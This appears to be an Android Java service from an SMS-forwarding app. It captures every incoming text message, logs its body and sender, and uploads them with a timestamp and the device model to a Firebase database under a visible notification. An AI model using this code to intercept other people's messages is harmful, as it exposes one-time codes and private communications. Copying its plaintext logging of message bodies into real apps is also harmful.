package xyz.xoventechdev.monir.appforhome;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import xyz.xoventechdev.monir.appforhome.R;


public class SmsForwardingService extends Service {

    private static final String TAG = "SmsForwardingService";
    private static final String CHANNEL_ID = "ForegroundServiceChannel";
    private static final int FOREGROUND_SERVICE_ID = 1; // Unique ID for the foreground service notification

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(FOREGROUND_SERVICE_ID, createNotification()); // Start foreground service with notification
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    SmsMessage[] messages = new SmsMessage[pdus.length];
                    StringBuilder fullMessage = new StringBuilder();
                    String phoneNumber = null;

                    for (int i = 0; i < pdus.length; i++) {
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        if (phoneNumber == null) {
                            phoneNumber = messages[i].getOriginatingAddress();
                        }
                        fullMessage.append(messages[i].getMessageBody());
                    }

                    String messageBody = fullMessage.toString();
                    String timestamp = getTimestamp(); // Get current timestamp
                    String mobileModel = Build.MODEL; // Get device model

                    // Log and forward the message to Firebase
                    Log.d(TAG, "Received SMS: " + messageBody + " from: " + phoneNumber);

                    // Save message to Firebase
                    forwardMessageToFirebase(phoneNumber, messageBody, timestamp, mobileModel);
                }
            }
        }

        return START_NOT_STICKY; // Don't automatically restart the service if killed by the system
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void forwardMessageToFirebase(String phoneNumber, String messageBody, String timestamp, String mobileModel) {
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("messages");

        SmsMessageModel message = new SmsMessageModel(phoneNumber, messageBody, timestamp, mobileModel);
        myRef.push().setValue(message).addOnCompleteListener(task -> {
            if (task.isSuccessful()) {
                Log.d(TAG, "Message saved successfully");
            } else {
                Log.e(TAG, "Failed to save message", task.getException());
            }
        });
    }

    private String getTimestamp() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        return sdf.format(new Date());
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this,
                0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT);
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("SMS Forwarding Service")
                .setContentText("Service is running")
                .setSmallIcon(R.drawable.ic_launcher_background)
                .setContentIntent(pendingIntent)
                .build();
    }
}
